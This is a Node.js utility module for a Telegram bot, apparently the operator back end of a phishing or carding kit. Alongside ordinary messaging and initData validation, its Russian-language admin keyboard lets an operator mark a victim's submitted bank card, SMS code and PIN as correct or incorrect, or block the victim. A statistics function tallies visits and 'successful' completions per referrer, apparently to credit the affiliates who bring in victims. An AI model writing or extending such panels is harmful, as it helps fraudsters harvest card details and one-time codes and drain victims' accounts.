const crypto = require("crypto");
const CONFIG = require("./config");

const API = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}`;

async function sendMessage(chatId, text, options = {}) {
  const body = { chat_id: chatId, text, parse_mode: "HTML", ...options };
  const res = await fetch(`${API}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  return res.json();
}

async function sendPhoto(chatId, photo, caption, options = {}) {
  const body = {
    chat_id: chatId,
    photo,
    caption,
    parse_mode: "HTML",
    ...options,
  };
  const res = await fetch(`${API}/sendPhoto`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  return res.json();
}

async function answerCallbackQuery(id, text = "") {
  const body = { callback_query_id: id, text };
  await fetch(`${API}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
}

async function editMessageText(chatId, messageId, text, replyMarkup = null) {
  const body = {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: "HTML",
  };
  if (replyMarkup) body.reply_markup = replyMarkup;
  else body.reply_markup = { inline_keyboard: [] };
  await fetch(`${API}/editMessageText`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
}

function validateInitData(initData) {
  if (!initData) return null;
  try {
    const params = new URLSearchParams(initData);
    const hash = params.get("hash");
    if (!hash) return null;
    params.delete("hash");

    const dataCheckString = [...params.entries()]
      .sort(([a], [b]) => a.localeCompare(b))
      .map(([k, v]) => `${k}=${v}`)
      .join("\n");

    const secretKey = crypto
      .createHmac("sha256", "WebAppData")
      .update(CONFIG.BOT_TOKEN)
      .digest();
    const calculated = crypto
      .createHmac("sha256", secretKey)
      .update(dataCheckString)
      .digest("hex");

    if (calculated !== hash) return null;

    const userStr = params.get("user");
    return userStr ? JSON.parse(userStr) : null;
  } catch {
    return null;
  }
}

function formatUserInfo(session) {
  let info = "";
  info += `🆔 ID: <code>${session.userId}</code>\n`;
  if (session.username) info += `👤 Username: @${session.username}\n`;
  if (session.firstName) info += `📝 Имя: ${session.firstName}\n`;
  if (session.phone) info += `📱 Телефон: <code>${session.phone}</code>\n`;
  if (session.referrer) info += `👥 Пригласил: ${session.referrer}\n`;
  return info;
}

function adminKeyboard(step, userId) {
  const labels = {
    card: ["✅ Карта верна", "❌ Карта не верна", "🚫 Заблокировать"],
    code: ["✅ SMS-код верный", "❌ SMS-код не верный", "🚫 Заблокировать"],
    pin: ["✅ Пин-код верный", "❌ Пин-код не верный", "🚫 Заблокировать"],
  };
  const l = labels[step];
  return {
    inline_keyboard: [
      [
        { text: l[0], callback_data: `ok_${step}_${userId}` },
        { text: l[1], callback_data: `no_${step}_${userId}` },
      ],
      [{ text: l[2], callback_data: `ban_${step}_${userId}` }],
    ],
  };
}

function formatStats(events) {
  const now = Date.now();

  const todayStart = new Date();
  todayStart.setHours(0, 0, 0, 0);

  const weekStart = new Date();
  const day = weekStart.getDay();
  const diffToMon = day === 0 ? 6 : day - 1;
  weekStart.setDate(weekStart.getDate() - diffToMon);
  weekStart.setHours(0, 0, 0, 0);

  const monthStart = new Date();
  monthStart.setDate(1);
  monthStart.setHours(0, 0, 0, 0);

  const periods = [
    { label: "За сегодня", from: todayStart.getTime() },
    { label: "За неделю", from: weekStart.getTime() },
    { label: "За месяц", from: monthStart.getTime() },
    { label: "За всё время", from: 0 },
  ];

  let text = "📊 <b>Статистика</b>\n";

  for (const period of periods) {
    const filtered = events.filter((e) => e.timestamp >= period.from && e.timestamp <= now);

    const starts = filtered.filter((e) => e.type === "start");
    const completes = filtered.filter((e) => e.type === "complete");

    const refStarts = {};
    const refCompletes = {};

    for (const e of starts) {
      const key = e.referrer || "Без реферала";
      refStarts[key] = (refStarts[key] || 0) + 1;
    }
    for (const e of completes) {
      const key = e.referrer || "Без реферала";
      refCompletes[key] = (refCompletes[key] || 0) + 1;
    }

    const allRefs = [...new Set([...Object.keys(refStarts), ...Object.keys(refCompletes)])];

    text += `\n═══ ${period.label} ═══\n`;
    text += `👥 Переходов: ${starts.length}\n`;
    text += `✅ Успешных: ${completes.length}\n`;

    if (allRefs.length > 0) {
      text += `\nПо рефералам:\n`;
      for (const ref of allRefs) {
        const s = refStarts[ref] || 0;
        const c = refCompletes[ref] || 0;
        text += `  ${ref} — 👥 ${s} / ✅ ${c}\n`;
      }
    }
  }

  return text;
}

module.exports = {
  sendMessage,
  sendPhoto,
  answerCallbackQuery,
  editMessageText,
  validateInitData,
  formatUserInfo,
  adminKeyboard,
  formatStats,
};
